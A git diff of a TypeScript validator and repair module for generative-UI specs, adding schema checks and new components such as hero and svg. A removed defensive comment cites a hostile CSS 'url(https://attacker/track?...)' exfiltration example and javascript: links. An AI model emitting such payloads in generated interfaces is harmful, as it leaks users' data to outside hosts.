@@ -19,69 +19,21 @@
  *   are elided.
  */
 import type { GenuiFileTreeNode, GenuiList, GenuiNode, GenuiPlot, GenuiPlotSeries, GenuiScene3D, GenuiSpec, GenuiDiagram, GenuiDiagramTheme, GenuiDiagramKind } from './spec.ts'
-import { wrapSingleComponentRoot } from './spec.ts'
-
-/** Hard resource limits enforced by repair (and mirrored at render time). */
-export const GENUI_LIMITS = {
-  /** Maximum nesting depth of the component tree. */
-  maxDepth: 8,
-  /** Maximum total nodes across the whole spec. */
-  maxNodes: 200,
-  /** Maximum length of any plain string field. */
-  maxString: 2000,
-  /** Maximum length of a `code` body. */
-  maxCode: 12_000,
-  /** Maximum length of a mermaid source. */
-  maxMermaid: 8000,
-  /** Maximum `grid` columns. */
-  maxGridCols: 12,
-  /** Maximum `tabs` count. */
-  maxTabs: 12,
-  /** Maximum `accordion` items. */
-  maxAccordionItems: 24,
-  /** Maximum `list` items. */
-  maxListItems: 50,
-  /** Maximum `select`/`radio` options. */
-  maxOptions: 50,
-  /** Maximum `table` rows / columns. */
-  maxTableRows: 50,
-  maxTableCols: 12,
-  /** Maximum `chart` data points per series. */
-  maxChartPoints: 60,
-  /** Maximum `plot` series and per-series parameters. */
-  maxPlotSeries: 8,
-  maxPlotParams: 6,
-  /** Maximum `scene3d` meshes. */
-  maxMeshes: 5,
-  /** Maximum `quiz` options. */
-  maxQuizOptions: 8,
-  /** Maximum `steps` / `timeline` / `breadcrumb` / `keyvalue` entries. */
-  maxSteps: 24,
-  maxTimelineItems: 24,
-  maxBreadcrumbItems: 12,
-  maxKeyValuePairs: 24,
-  /** Maximum `file-tree` nesting. */
-  maxTreeDepth: 6,
-  /** Maximum `diagram` nodes / edges / zones / focal accents (editorial
-   * complexity budget, mirroring diagram-design's §7 limits). */
-  maxDiagramNodes: 9,
-  maxDiagramEdges: 12,
-  maxDiagramZones: 3,
-  maxDiagramFocal: 2,
-  maxDiagramLabel: 14,
-
-  /** Maximum depth of an `echart` option object (prevents pathological nested
-   * ECharts configs from stalling the guard walk). */
-  maxEChartOptionDepth: 10,
-  /** Maximum length of any single array inside an `echart` option (prevents
-   * a model from stalling rendering with `series.data` of hundreds of
-   * thousands of points). */
-  maxEChartArrayLen: 500,
-  /** Maximum total entries (object keys + array elements) traversed while
-   * sanitizing an `echart` option. Bounds the walk so a pathologically
-   * large option object cannot stall the guard. */
-  maxEChartOptionNodes: 2000,
-} as const
+import { isComponentRoot, wrapSingleComponentRoot } from './spec.ts'
+import {
+  BADGE_TONES, BUTTON_TONES, CALLOUT_TONES, CARD_TONES, CHART_KINDS, COMPONENT_SCHEMAS, HERO_TONES,
+  DIAGRAM_EDGE_KINDS, DIAGRAM_KINDS, DIAGRAM_NODE_TYPES, DIAGRAM_ROUTES, DIAGRAM_VARIANTS,
+  ECHART_PRESETS, FILE_TYPES, GENUI_NATIVE_TYPES, GENUI_SPEC_SCHEMA, INPUT_TYPES,
+  MEDIA_ASPECT_RATIOS, MESH_SHAPES, PLOT_KINDS, PROGRESS_VARIANTS, TABLE_CELL_TYPES, TEXT_SIZES,
+} from './genui-runtime/schema.ts'
+import type { ComponentFieldKind, ComponentRecordSchema, ComponentSchema } from './genui-runtime/schema.ts'
+import { normalizeGenuiSpec } from './genui-runtime/normalize.ts'
+import { diagnoseUnknownGenuiFields } from './genui-runtime/diagnostics.ts'
+import type { GenuiDiagnostic } from './genui-runtime/diagnostics.ts'
+import { GENUI_LIMITS } from './genui-runtime/limits.ts'
+import { analyzeSubmissionRegistry } from './submission-registry.ts'
+import { isTableDetailReachable, prepareTableRows, tableRowsForDetails } from './table-details.ts'
+import { color, enu, int, num, obj, opt, safeHref, safeMediaSrc, str } from './genui-runtime/value-utils.ts'
 
 /** Result of `validateGenuiSpec`. */
 export interface GenuiValidation {
@@ -90,110 +42,168 @@ export interface GenuiValidation {
   errors: string[]
 }
 
-/* ---------------- shared field helpers ---------------- */
+/* ---------------- schema field helpers ---------------- */
 
-/** Is `v` one of `values`? (enum guard) */
-function inEnum<T extends string>(v: unknown, values: readonly T[]): v is T {
-  return typeof v === 'string' && (values as readonly string[]).includes(v)
+function fieldKindMatches(value: unknown, kind: ComponentFieldKind): boolean {
+  switch (kind) {
+    case 'string': return typeof value === 'string'
+    case 'string-or-null': return value === null || typeof value === 'string'
+    case 'number': return typeof value === 'number' && Number.isFinite(value)
+    case 'boolean': return typeof value === 'boolean'
+    case 'nodes': return Array.isArray(value)
+    case 'array': return Array.isArray(value)
+    case 'object': return obj(value) !== undefined
+    case 'unknown': return true
+  }
 }
 
-/** String field: truncate a string to `cap`, or undefined when not a string. */
-function str(v: unknown, cap: number): string | undefined {
-  return typeof v === 'string' ? v.slice(0, cap) : undefined
+function fieldKindLabel(kind: ComponentFieldKind): string {
+  switch (kind) {
+    case 'string-or-null': return 'a string or null'
+    case 'number': return 'a finite number'
+    case 'boolean': return 'a boolean'
+    case 'nodes': case 'array': return 'an array'
+    case 'object': return 'an object'
+    case 'unknown': return 'a value'
+    default: return 'a string'
+  }
+}
+
+/** Detect an existing field diagnostic using both canonical and legacy messages. */
+function hasFieldError(errors: readonly string[], at: string, field: string): boolean {
+  return errors.some(error =>
+    error.startsWith(`${at}.${field} `) || error.includes(`'${field}'`) || error.includes(`requires ${field}`))
+}
+
+/** Validate present fields against the runtime schema without duplicating errors. */
+function validateSchemaFieldKinds(
+  value: Record<string, unknown>,
+  at: string,
+  definition: ComponentSchema,
+  errors: string[],
+  excludedFields: readonly string[] = [],
+): void {
+  for (const [field, kind] of Object.entries(definition.fields)) {
+    if (excludedFields.includes(field) || value[field] === undefined) continue
+    if (!fieldKindMatches(value[field], kind) && !hasFieldError(errors, at, field)) {
+      errors.push(`${at}.${field} must be ${fieldKindLabel(kind)}`)
+    }
+  }
+  for (const [field, values] of Object.entries(definition.enums)) {
+    if (excludedFields.includes(field) || value[field] === undefined || !fieldKindMatches(value[field], 'string')) continue
+    if (!values.includes(value[field] as string) && !hasFieldError(errors, at, field)) {
+      errors.push(`${at}.${field} must be one of ${values.join(', ')}`)
+    }
+  }
+}
+
+/** Validate one schema-declared nested record and all records below it. */
+function validateRecordSchema(
+  value: unknown,
+  at: string,
+  definition: ComponentRecordSchema,
+  errors: string[],
+): void {
+  const holder = obj(value)
+  if (holder === undefined) {
+    errors.push(`${at} must be an object`)
+    return
+  }
+  for (const field of definition.required) {
+    const kind = definition.fields[field]
+    if (holder[field] === undefined) {
+      if (!hasFieldError(errors, at, field)) errors.push(`${at}: requires ${field}${kind === undefined ? '' : ` (${fieldKindLabel(kind)})`}`)
+    } else if (kind !== undefined && !fieldKindMatches(holder[field], kind)) {
+      if (!hasFieldError(errors, at, field)) errors.push(`${at}.${field} must be ${fieldKindLabel(kind)}`)
+    }
+  }
+  for (const [field, kind] of Object.entries(definition.fields)) {
+    if (holder[field] !== undefined && !fieldKindMatches(holder[field], kind)) {
+      if (!hasFieldError(errors, at, field)) errors.push(`${at}.${field} must be ${fieldKindLabel(kind)}`)
+    }
+  }
+  for (const [field, values] of Object.entries(definition.enums)) {
+    if (holder[field] !== undefined && typeof holder[field] === 'string' && !values.includes(holder[field])) {
+      if (!hasFieldError(errors, at, field)) errors.push(`${at}.${field} must be one of ${values.join(', ')}`)
+    }
+  }
+  for (const [field, nested] of Object.entries(definition.nested)) {
+    const nestedValue = holder[field]
+    if (nestedValue === undefined) continue
+    if (Array.isArray(nestedValue)) {
+      nestedValue.forEach((item, index) => validateRecordSchema(item, `${at}.${field}[${index}]`, nested, errors))
+    } else {
+      validateRecordSchema(nestedValue, `${at}.${field}`, nested, errors)
+    }
+  }
+}
+
+/** Validate registry-declared nested records before repair can discard them. */
+function validateNestedRecordSchemas(
+  value: Record<string, unknown>,
+  at: string,
+  definition: ComponentSchema,
+  errors: string[],
+): void {
+  for (const [field, nested] of Object.entries(definition.nested)) {
+    const nestedValue = value[field]
+    if (nestedValue === undefined) continue
+    if (Array.isArray(nestedValue)) {
+      nestedValue.forEach((item, index) => validateRecordSchema(item, `${at}.${field}[${index}]`, nested, errors))
+    } else {
+      validateRecordSchema(nestedValue, `${at}.${field}`, nested, errors)
+    }
+  }
 }
 
 /**
- * Color field: the value lands in an inline `style` (background/stroke) or
- * THREE.Color. Arbitrary CSS values are an exfiltration channel — a model
- * (or a hostile spec) could emit `url(https://attacker/track?...)` and the
- * browser would fetch it. Only formats that name a color pass: hex, rgb/hsl
- * functions, and host design tokens (`var(--dsw-*)`). Anything else degrades
- * to the component's default palette.
+ * Does this table state its columns implicitly, in a 2D `rows`/`data` body?
+ * Repair turns the leading row into the header (see `deriveTableColumns`), so
+ * validation must not report the missing `columns` that repair is about to
+ * supply — while still reporting it for bodies repair cannot read (a scalar
+ * `rows`, an empty array, a 1D list).
  */
-const SAFE_COLOR_RE = /^(?:#[\da-fA-F]{3,8}|rgba?\([^)]{0,64}\)|hsla?\([^)]{0,64}\)|var\(--dsw-[\w-]+(?:,\s*#[0-9a-fA-F]{3,8})?\))$/
-
-function color(v: unknown): string | undefined {
-  if (typeof v !== 'string') return undefined
-  const s = v.trim()
-  return s.length <= 64 && SAFE_COLOR_RE.test(s) ? s : undefined
+function hasDerivableTableColumns(value: Record<string, unknown>): boolean {
+  const rows = value.rows !== undefined ? value.rows : value.data
+  if (!Array.isArray(rows) || rows.length === 0) return false
+  return Array.isArray(rows[0])
 }
 
-/**
- * Link target field: only http(s) and mailto survive. `javascript:`/`data:`
- * and every other scheme degrade to a plain-text node — the model's link is
- * display, not an execution channel.
- */
-function safeHref(v: unknown): string | undefined {
-  if (typeof v !== 'string') return undefined
-  const s = v.trim()
-  if (s.length > 2048) return undefined
-  return /^https?:\/\//i.test(s) || /^mailto:[^@\s]+@[^@\s]+$/i.test(s) ? s : undefined
+/** Validate the registry-declared presence and primitive shape of a native node. */
+function validateRegistryFields(
+  value: Record<string, unknown>,
+  at: string,
+  definition: ComponentSchema,
+  errors: string[],
+): void {
+  const type = String(value.type)
+  const alreadyReported = (field: string): boolean => hasFieldError(errors, at, field)
+  const derivableField = type === 'table' && hasDerivableTableColumns(value) ? 'columns' : null
+  for (const field of definition.required) {
+    const kind = definition.fields[field]
+    if (kind === undefined || value[field] === undefined) {
+      if (field !== derivableField && !alreadyReported(field)) errors.push(`${at}: type '${type}' requires ${field}${kind === undefined ? '' : ` (${fieldKindLabel(kind)})`}`)
+      continue
+    }
+    if (!fieldKindMatches(value[field], kind) && !alreadyReported(field)) errors.push(`${at}.${field} must be ${fieldKindLabel(kind)}`)
+  }
+  validateSchemaFieldKinds(value, at, definition, errors, ['type'])
+  for (const group of definition.oneOfRequired) {
+    if (!group.some(field => value[field] !== undefined)
+      && !errors.some(error => error.includes(`requires ${group.join(' or ')}`))) {
+      errors.push(`${at}: type '${type}' requires one of ${group.join(' or ')}`)
+    }
+  }
+  for (const rule of definition.conditionalRequired) {
+    if (value[rule.when.field] !== rule.when.equals) continue
+    for (const field of rule.required) {
+      if (value[field] === undefined && !alreadyReported(field)) {
+        errors.push(`${at}: type '${type}' requires ${field}${rule.message === undefined ? '' : ` (${rule.message})`}`)
+      }
+    }
+  }
+  validateNestedRecordSchemas(value, at, definition, errors)
 }
-
-/** Media loads bytes, so accept only browser-reachable http(s) or same-origin
- * relative paths. Active/local schemes and protocol-relative URLs are
- * rejected. The renderer always keeps playback user-controlled. */
-function safeMediaSrc(v: unknown): string | undefined {
-  if (typeof v !== 'string') return undefined
-  const s = v.trim()
-  if (s === '' || s.length > 2048) return undefined
-  if (/^https?:\/\//i.test(s)) return s
-  if (/^[a-z][a-z0-9+.-]*:/i.test(s) || /^[/\\]{2}/.test(s)) return undefined
-  return s
-}
-
-/** Finite-number field: clamp into [min, max], or undefined when not finite. */
-function num(v: unknown, min: number, max: number): number | undefined {
-  return typeof v === 'number' && Number.isFinite(v) ? Math.min(max, Math.max(min, v)) : undefined
-}
-
-/** Integer field: clamp into [min, max], or undefined when not a finite integer. */
-function int(v: unknown, min: number, max: number): number | undefined {
-  return typeof v === 'number' && Number.isFinite(v) ? Math.min(max, Math.max(min, Math.trunc(v))) : undefined
-}
-
-/** Optional enum field: the value when it matches, otherwise undefined. */
-function enu<T extends string>(v: unknown, values: readonly T[]): T | undefined {
-  return inEnum(v, values) ? v : undefined
-}
-
-/** Plain object (not array, not null). */
-function obj(v: unknown): Record<string, unknown> | undefined {
-  return typeof v === 'object' && v !== null && !Array.isArray(v) ? v as Record<string, unknown> : undefined
-}
-
-/**
- * Optional-field spread helper. `exactOptionalPropertyTypes` forbids
- * `{ gap: number | undefined }`; computing the value into a const first and
- * spreading `opt('gap', g)` keeps every optional field either absent or a
- * plain value.
- */
-function opt<K extends string, V>(key: K, value: V | undefined): Partial<Record<K, V>> {
-  return value === undefined ? {} : { [key]: value } as Partial<Record<K, V>>
-}
-
-const TEXT_SIZES = ['h1', 'h2', 'h3', 'body', 'muted', 'caption'] as const
-const BUTTON_TONES = ['primary', 'danger', 'success', 'ghost'] as const
-const BADGE_TONES = ['success', 'warn', 'danger', 'accent'] as const
-const INPUT_TYPES = ['text', 'email', 'password'] as const
-const CALLOUT_TONES = ['info', 'success', 'warning', 'error'] as const
-const CHART_KINDS = ['bars', 'line', 'donut'] as const
-const PLOT_KINDS = ['line', 'area', 'scatter'] as const
-const MEDIA_ASPECT_RATIOS = ['16:9', '4:3', '1:1', '9:16'] as const
-const MESH_SHAPES = ['box', 'sphere', 'cone', 'cylinder', 'torus'] as const
-const FILE_TYPES = ['file', 'dir'] as const
-const DIAGRAM_KINDS: readonly string[] = [
-  'architecture', 'it-state', 'flowchart', 'sequence', 'state', 'er', 'timeline',
-  'swimlane', 'quadrant', 'radar', 'loop', 'nested', 'tree', 'org-chart', 'layers',
-  'venn', 'pyramid', 'bar', 'line', 'gantt', 'scatter', 'high-level', 'process',
-  'medallion', 'data-flow', 'dp-integration', 'dp-security-matrix',
-]
-const DIAGRAM_NODE_TYPES = ['focal', 'backend', 'store', 'external', 'input', 'optional', 'security'] as const
-const DIAGRAM_VARIANTS = ['light', 'dark', 'editorial'] as const
-const DIAGRAM_EDGE_KINDS = ['solid', 'dashed', 'accent', 'link'] as const
-const DIAGRAM_ROUTES = ['auto', 'orthogonal', 'straight'] as const
-
-const ECHART_PRESETS = ['bar', 'line', 'area', 'pie', 'scatter'] as const
 
 /* ---------------- repair ---------------- */
 
@@ -215,7 +225,41 @@ function repairItems(list: unknown, ctx: RepairCtx, depth: number): GenuiNode[] 
   return out
 }
 
+/** Optional explicit palette: up to 12 validated colour values. */
+function paletteValues(v: unknown): string[] | undefined {
+  if (!Array.isArray(v)) return undefined
+  const out: string[] = []
+  for (const item of v.slice(0, 12)) {
+    const value = color(item)
+    if (value === undefined) continue
+    out.push(value)
+  }
+  return out.length > 0 ? out : undefined
+}
+
+/** Optional `stat.spark` series: finite numbers only, 2..60 points. */
+function sparkValues(v: unknown): number[] | undefined {
+  if (!Array.isArray(v)) return undefined
+  const out: number[] = []
+  for (const item of v.slice(0, 60)) {
+    const n = typeof item === 'number' ? item : Number(item)
+    if (!Number.isFinite(n)) return undefined
+    out.push(n)
+  }
+  return out.length >= 2 ? out : undefined
+}
+
+/** Layout hints are component-agnostic: `span` survives repair on ANY node
+ *  (the renderer applies it inside a grid). Kept out of the per-case switches
+ *  so a new component type cannot forget it. */
 function repairNode(value: unknown, ctx: RepairCtx, depth: number): GenuiNode | null {
+  const node = repairNodeFields(value, ctx, depth)
+  if (node === null) return null
+  const span = int(obj(value)?.span, 2, 12)
+  return span === undefined ? node : ({ ...node, span } as GenuiNode)
+}
+
+function repairNodeFields(value: unknown, ctx: RepairCtx, depth: number): GenuiNode | null {
   if (depth > GENUI_LIMITS.maxDepth) return null
   const v = obj(value)
   if (v === undefined) return null
@@ -237,7 +281,13 @@ function repairNode(value: unknown, ctx: RepairCtx, depth: number): GenuiNode | 
       return { type: 'grid', cols: int(v.cols, 1, GENUI_LIMITS.maxGridCols) ?? 1, items: repairItems(v.items, ctx, depth + 1) }
     }
     case 'card': {
-      return { type: 'card', items: repairItems(v.items, ctx, depth + 1), ...opt('title', str(v.title, GENUI_LIMITS.maxString)) }
+      return {
+        type: 'card',
+        items: repairItems(v.items, ctx, depth + 1),
+        ...opt('title', str(v.title, GENUI_LIMITS.maxString)),
+        ...opt('tone', enu(v.tone, CARD_TONES)),
+        ...opt('accent', color(v.accent)),
+      }
     }
     case 'button': {
       const label = str(v.label, GENUI_LIMITS.maxString)
@@ -276,7 +326,12 @@ function repairNode(value: unknown, ctx: RepairCtx, depth: number): GenuiNode | 
     case 'checkbox': {
       const label = str(v.label, GENUI_LIMITS.maxString)
       if (label === undefined) return null
-      return { type: 'checkbox', label, ...opt('checked', v.checked === true ? true : undefined), ...opt('action', str(v.action, 200)) }
+      return {
+        type: 'checkbox', label,
+        ...opt('checked', v.checked === true ? true : undefined),
+        ...opt('action', str(v.action, 200)),
+        ...opt('group', str(v.group, 200)),
+      }
     }
     case 'link': {
       const label = str(v.label, GENUI_LIMITS.maxString)
@@ -317,16 +372,40 @@ function repairNode(value: unknown, ctx: RepairCtx, depth: number): GenuiNode | 
       if (label === undefined) return null
       return { type: 'badge', label, ...opt('tone', enu(v.tone, BADGE_TONES)), ...opt('icon', str(v.icon, 64)) }
     }
+    case 'hero': {
+      const title = str(v.title, GENUI_LIMITS.maxString)
+      if (title === undefined) return null
+      return {
+        type: 'hero', title,
+        ...opt('subtitle', str(v.subtitle, GENUI_LIMITS.maxString)),
+        ...opt('value', str(v.value, 128)),
+        ...opt('label', str(v.label, GENUI_LIMITS.maxString)),
+        ...opt('delta', str(v.delta, 64)),
+        ...opt('spark', sparkValues(v.spark)),
+        ...opt('tone', enu(v.tone, HERO_TONES)),
+      }
+    }
     case 'stat': {
       const label = str(v.label, GENUI_LIMITS.maxString)
       const value = str(v.value, 128)
       if (label === undefined || value === undefined) return null
-      return { type: 'stat', label, value, ...opt('delta', str(v.delta, 64)) }
+      return {
+        type: 'stat', label, value,
+        ...opt('delta', str(v.delta, 64)),
+        ...opt('spark', sparkValues(v.spark)),
+        ...opt('size', v.size === 'hero' ? 'hero' as const : undefined),
+      }
     }
     case 'progress': {
       const value = num(v.value, 0, 100)
       if (value === undefined) return null
-      return { type: 'progress', value, ...opt('label', str(v.label, GENUI_LIMITS.maxString)), ...opt('valueLabel', str(v.valueLabel, 64)) }
+      return {
+        type: 'progress', value,
+        ...opt('label', str(v.label, GENUI_LIMITS.maxString)),
+        ...opt('valueLabel', str(v.valueLabel, 64)),
+        ...opt('variant', enu(v.variant, PROGRESS_VARIANTS)),
+        ...opt('target', num(v.target, 0, 100)),
+      }
     }
     case 'divider': return { type: 'divider' }
     case 'spacer': return { type: 'spacer' }
@@ -338,29 +417,43 @@ function repairNode(value: unknown, ctx: RepairCtx, depth: number): GenuiNode | 
     case 'list': {
       const items = repairListItems(v.items, GENUI_LIMITS.maxListItems, ctx, depth + 1)
       if (items === undefined) return null
-      return { type: 'list', items }
+      return { type: 'list', items, ...opt('filter', str(v.filter, 64)) }
     }
     case 'table': {
-      let rawCols = v.columns as unknown
-      let rawRows = v.rows !== undefined ? v.rows : (v as Record<string, unknown>).data
-      // Self-heal model-shaped tables: antd-style object columns
-      // ({title,key}) become header strings, and object-array rows (or a
-      // `data` alias) flatten to 2D rows keyed by the column keys — without
-      // this the whole node is dropped for "missing 2D rows" and the user
-      // sees nothing (issue #42).
-      if (Array.isArray(rawCols) && rawCols.length > 0 && typeof rawCols[0] === 'object' && rawCols[0] !== null) {
-        rawCols = rawCols.map(c => columnHeaderText(c))
+      const prepared = prepareTableRows(v)
+      if (prepared === null) return null
+      const { columns, rows } = prepared
+      // Optional per-column cell types; unknown entries degrade to 'text'.
+      const rawTypes = Array.isArray(v.types) ? v.types : undefined
+      const types = rawTypes === undefined
+        ? undefined
+        : columns.map((_c, i) => {
+          const raw = rawTypes[i]
+          return typeof raw === 'string' && (TABLE_CELL_TYPES as readonly string[]).includes(raw)
+            ? raw as typeof TABLE_CELL_TYPES[number]
+            : 'text'
+        })
+      // Master-detail payload: positionally aligned with `rows`. Entries that
+      // repair to nothing stay null so the renderer never shows an empty
+      // expander; extra entries beyond the row count are dropped.
+      const rawDetails = Array.isArray(v.details) ? v.details : undefined
+      const details = rawDetails === undefined
+        ? undefined
+        : rows.map((_row, i) => {
+          if (!isTableDetailReachable({ columns, rows, types }, i)) return null
+          const entry = repairItems(rawDetails[i], ctx, depth + 1)
+          return entry.length === 0 ? null : entry
+        })
+      return {
+        type: 'table', columns, rows,
+        ...opt('types', types),
+        ...opt('total', v.total === true ? true : undefined),
+        ...opt('export', v.export === true ? true : undefined),
+        ...opt('filter', str(v.filter, 64)),
+        ...opt('filterColumn', int(v.filterColumn, 0, GENUI_LIMITS.maxTableCols - 1)),
+        ...opt('sortField', str(v.sortField, 64)),
+        ...opt('details', details !== undefined && details.some(d => d !== null) ? details : undefined),
       }
-      if (Array.isArray(rawRows) && rawRows.length > 0 && typeof rawRows[0] === 'object' && rawRows[0] !== null && !Array.isArray(rawRows[0])) {
-        const keys = Array.isArray(v.columns) && v.columns.length > 0 && typeof v.columns[0] === 'object' && v.columns[0] !== null
-          ? v.columns.map(c => columnKeyOf(c)).filter((k): k is string => k !== undefined)
-          : Object.keys(rawRows[0] as Record<string, unknown>)
-        rawRows = rawRows.map(row => keys.map(k => cellText((row as Record<string, unknown>)[k])))
-      }
-      const columns = repairStrings(rawCols, GENUI_LIMITS.maxTableCols, 128)
-      const rows = repairRows(rawRows, GENUI_LIMITS.maxTableRows, GENUI_LIMITS.maxTableCols)
-      if (columns === undefined || rows === undefined) return null
-      return { type: 'table', columns, rows }
     }
     case 'chart': {
       const data = repairChartData(v.data, GENUI_LIMITS.maxChartPoints)
@@ -369,7 +462,15 @@ function repairNode(value: unknown, ctx: RepairCtx, depth: number): GenuiNode | 
       // alone; a series-only chart gets an empty data array (the renderer
       // reads `series` in that case).
       if (data === undefined && series === undefined) return null
-      return { type: 'chart', data: data ?? [], ...opt('kind', enu(v.kind, CHART_KINDS)), ...opt('series', series) }
+      return {
+        type: 'chart', data: data ?? [],
+        ...opt('kind', enu(v.kind, CHART_KINDS)),
+        ...opt('series', series),
+        ...opt('horizontal', v.horizontal === true ? true : undefined),
+        ...opt('stacked', v.stacked === true ? true : undefined),
+        ...opt('filter', str(v.filter, 64)),
+        ...opt('palette', paletteValues(v.palette)),
+      }
     }
     case 'tabs': {
       const tabs = repairTabs(v.tabs, ctx, depth)
@@ -439,10 +540,7 @@ function repairNode(value: unknown, ctx: RepairCtx, depth: number): GenuiNode | 
     }
     case 'submit': {
       const label = str(v.label, GENUI_LIMITS.maxString)
-      // action is OPTIONAL: local grading (any question carries `answer`)
-      // needs no round trip, so a submit without an action is valid. It only
-      // becomes semantically required when no local answers exist — the
-      // renderer disables the button then (honest affordance).
+      // 本地判卷可以不设置 action；不满足判卷条件时，渲染器会禁用无 action 的按钮。
       const action = str(v.action, 200)
       if (label === undefined) return null
       return {
@@ -496,6 +594,11 @@ function repairNode(value: unknown, ctx: RepairCtx, depth: number): GenuiNode | 
       if (text === undefined) return null
       return { type: 'copy', text, ...opt('label', str(v.label, 128)) }
     }
+    case 'svg': {
+      const code = str(v.code, GENUI_LIMITS.maxCode)
+      if (code === undefined) return null
+      return { type: 'svg', code, ...opt('title', str(v.title, GENUI_LIMITS.maxString)), ...opt('height', int(v.height, 100, 800)) }
+    }
     case 'mermaid': {
       const code = str(v.code, GENUI_LIMITS.maxMermaid)
       if (code === undefined) return null
@@ -542,6 +645,16 @@ function repairNode(value: unknown, ctx: RepairCtx, depth: number): GenuiNode | 
       const series = v.series !== undefined && Array.isArray(v.series)
         ? repairSeries(v.series, GENUI_LIMITS.maxPlotSeries, GENUI_LIMITS.maxChartPoints)
         : undefined
+      // sankey / graph edges: `from`/`to` must be strings, `value` a number.
+      const links = Array.isArray(v.links)
+        ? v.links.slice(0, GENUI_LIMITS.maxChartPoints).flatMap(entry => {
+          const e = obj(entry)
+          const from = e === undefined ? undefined : str(e.from, 64)
+          const to = e === undefined ? undefined : str(e.to, 64)
+          if (from === undefined || to === undefined) return []
+          return [{ from, to, ...opt('value', num(e!.value, 0, 1e9)) }]
+        })
+        : undefined
       // Full option: depth-bounded pass-through (the model writes the ECharts
       // option object; the guard walks it to cap nesting but does not
       // validate ECharts semantics — that is echarts' own job).
@@ -554,8 +667,9 @@ function repairNode(value: unknown, ctx: RepairCtx, depth: number): GenuiNode | 
         sanitized === undefined || typeof sanitized !== 'object' || sanitized === null || Array.isArray(sanitized)
           ? undefined
           : sanitized as Record<string, unknown>
-      // At least one of preset+data or option must be present.
-      if (option === undefined && data === undefined && series === undefined) return null
+      // At least one of preset+data, links or option must be present.
+      if (option === undefined && data === undefined && series === undefined
+        && (links === undefined || links.length === 0)) return null
       return {
         type: 'echart',
         ...opt('title', str(v.title, GENUI_LIMITS.maxString)),
@@ -563,6 +677,8 @@ function repairNode(value: unknown, ctx: RepairCtx, depth: number): GenuiNode | 
         ...opt('preset', enu(v.preset, ECHART_PRESETS)),
         ...opt('data', data),
         ...opt('series', series),
+        ...opt('links', links !== undefined && links.length > 0 ? links : undefined),
+        ...opt('palette', paletteValues(v.palette)),
         ...opt('option', option),
       }
     }
@@ -612,11 +728,6 @@ function repairListItems(
       continue
     }
     const o = obj(item)
-    const title = o === undefined ? undefined : str(o.title, GENUI_LIMITS.maxString)
-    if (title !== undefined) {
-      out.push({ title, ...opt('desc', o === undefined ? undefined : str(o.desc, GENUI_LIMITS.maxString)) })
-      continue
-    }
     if (o !== undefined && typeof o.type === 'string') {
       // Typed children are GenuiNodes: charge them against the shared node
       // budget (module header promise — exhausted budget elides remaining
@@ -626,24 +737,12 @@ function repairListItems(
       ctx.remaining -= 1
       const node = repairNode(o, ctx, depth)
       if (node !== null) out.push(node)
+      continue
     }
-  }
-  return out
-}
-
-function repairRows(v: unknown, rowCap: number, colCap: number): Array<Array<string | number>> | undefined {
-  if (!Array.isArray(v)) return undefined
-  const out: Array<Array<string | number>> = []
-  for (const row of v) {
-    if (out.length >= rowCap) break
-    if (!Array.isArray(row)) continue
-    const cells: Array<string | number> = []
-    for (const cell of row) {
-      if (cells.length >= colCap) break
-      if (typeof cell === 'string') cells.push(cell.slice(0, 256))
-      else if (typeof cell === 'number' && Number.isFinite(cell)) cells.push(cell)
+    const title = o === undefined ? undefined : str(o.title, GENUI_LIMITS.maxString)
+    if (title !== undefined) {
+      out.push({ title, ...opt('desc', str(o?.desc, GENUI_LIMITS.maxString)) })
     }
-    if (cells.length > 0) out.push(cells)
   }
   return out
 }
@@ -692,38 +791,6 @@ function repairTabs(v: unknown, ctx: RepairCtx, depth: number): Array<{ label: s
     out.push({ label, items: repairItems(rawItems, ctx, depth + 1) })
   }
   return out
-}
-
-/** Header text for an object-shaped table column ({title,key} antd style). */
-function columnHeaderText(c: unknown): string {
-  const o = obj(c)
-  if (o === undefined) return String(c)
-  for (const k of ['title', 'label', 'key', 'dataIndex'] as const) {
-    const s = o[k]
-    if (typeof s === 'string' && s !== '') return s
-  }
-  return JSON.stringify(c)
-}
-
-/** Row key for an object-shaped column, mirroring columnHeaderText's order. */
-function columnKeyOf(c: unknown): string | undefined {
-  const o = obj(c)
-  if (o === undefined) return undefined
-  for (const k of ['key', 'dataIndex', 'title', 'label'] as const) {
-    const s = o[k]
-    if (typeof s === 'string' && s !== '') return s
-  }
-  return undefined
-}
-
-/** Cell text for object-array rows: strings/finite numbers pass through,
- * everything else stringifies so the column alignment is preserved
- * (repairRows would drop null/undefined cells and shift the row). */
-function cellText(v: unknown): string | number {
-  if (typeof v === 'string') return v
-  if (typeof v === 'number' && Number.isFinite(v)) return v
-  if (v === null || v === undefined) return ''
-  return JSON.stringify(v)
 }
 
 function repairPlotSeries(v: unknown, cap: number): GenuiPlot['series'] | undefined {
@@ -948,7 +1015,11 @@ function repairDiagram(v: unknown): GenuiDiagram | null {
   const zones = repairDiagramZones(o.zones)
   if (zones === undefined) return null
   return {
-    type: 'diagram', kind, nodes, edges, zones,
+    // `zones` is optional: emitting `zones: []` made every diagram node differ
+    // from its input for no reason (and broke the "gallery survives the guard
+    // unchanged" contract).
+    type: 'diagram', kind, nodes, edges,
+    ...opt('zones', zones.length > 0 ? zones : undefined),
     ...opt('variant', enu(o.variant, DIAGRAM_VARIANTS)),
     ...opt('title', str(o.title, 256)),
     ...opt('theme', repairDiagramTheme(o.theme)),
@@ -1083,7 +1154,7 @@ function sanitizeEChartOption(v: unknown, depth: number, budget: EChartSanitizeB
       const s = sanitizeEChartOption(v[i], depth + 1, budget)
       if (s !== undefined) arr.push(s)
     }
-    return arr.length > 0 ? arr : undefined
+    return arr.length > 0 || v.length === 0 ? arr : undefined
   }
   const o = obj(v)
   if (o === undefined) return undefined
@@ -1099,7 +1170,9 @@ function sanitizeEChartOption(v: unknown, depth: number, budget: EChartSanitizeB
     }
     out[key] = s
   }
-  return Object.keys(out).length > 0 ? out : undefined
+  // Empty axes/tooltip enable ECharts defaults; an empty data array clears it.
+  // Keep intentional empties, while still dropping objects stripped by guards.
+  return Object.keys(out).length > 0 || Object.keys(o).length === 0 ? out : undefined
 }
 
 /**
@@ -1110,14 +1183,18 @@ function sanitizeEChartOption(v: unknown, depth: number, budget: EChartSanitizeB
  * dropping/clamping/truncating. Idempotent: repairing a repaired spec is a
  * no-op.
  */
-export function repairGenuiSpec(value: unknown): GenuiSpec | null {
+function repairCanonicalGenuiSpec(value: unknown): GenuiSpec | null {
   const v = obj(value)
   if (v === undefined) return null
-  if (!Array.isArray(v.items)) {
+  // A bare component root (including data components whose `items` is their
+  // record list — steps/list/timeline/…) wraps first; the wrapper is a plain
